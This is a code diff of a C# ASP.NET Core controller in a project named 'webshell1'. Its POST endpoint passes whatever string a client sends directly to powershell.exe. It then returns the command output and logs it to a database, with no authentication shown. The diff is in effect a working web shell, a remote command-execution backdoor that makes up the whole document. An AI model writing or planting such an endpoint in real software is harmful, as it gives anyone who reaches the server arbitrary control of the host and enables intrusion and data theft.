@@ -5,7 +5,6 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
-using System.Management.Automation;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -16,7 +15,7 @@ namespace webshell1.Controllers
     public class CommandsController : Controller
     {
         private readonly CommandContext context;
-    
+
         public CommandsController(CommandContext context)
         {
             this.context = context;
@@ -26,35 +25,44 @@ namespace webshell1.Controllers
         {
             return await context.Commands.ToListAsync();
         }
-        [HttpPost]
-        public async Task PostCommand([FromBody] string input)
+        [HttpGet("{id}")]
+        public async Task<ActionResult<Command>> GetCommand(int id)
         {
-            string output = await RunScript(input);
+            var command = await context.Commands.FindAsync(id);
+
+            if (command == null)
+            {
+                return NotFound();
+            }
+
+            return command;
+        }
+        [HttpPost]
+        public async Task<ActionResult<Command>> PostCommand([FromBody] string input)
+        {
+            string output = Execute(input);
             Command command = new Command { Input = input, Output = output };
             context.Commands.Add(command);
             await context.SaveChangesAsync();
-            //return CreatedAtAction("Index", new { id = command.Id }, command);
+            return CreatedAtAction("Index", new { id = command.Id }, command);
         }
-        public async Task<string> RunScript(string scriptContents)
+        private string Execute(string input)
         {
-            // create a new hosted PowerShell instance using the default runspace.
-            // wrap in a using statement to ensure resources are cleaned up.
-            string output = "";
-            PowerShell ps = PowerShell.Create();
-                
-                // specify the script code to run.
-                ps.AddScript(scriptContents);
-
-                // execute the script and await the result.
-                var pipelineObjects = await ps.InvokeAsync();
-
-            // print the resulting pipeline objects to the console.
-            foreach (var item in pipelineObjects)
-
-                output += item.BaseObject.ToString();
-        }
+            Process process = new Process();
+            process.StartInfo.FileName = "powershell.exe";
+            //process.StartInfo.Arguments = string.Concat("/C ", input);
+            process.StartInfo.Arguments = input;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.Start();
+            StreamReader outputReader = process.StandardOutput;
+            StreamReader errorReader = process.StandardError;
+            string output = string.Concat(outputReader.ReadToEnd(), errorReader.ReadToEnd());
+            process.WaitForExit();
             return output;
         }
     }
-    }
+}
 
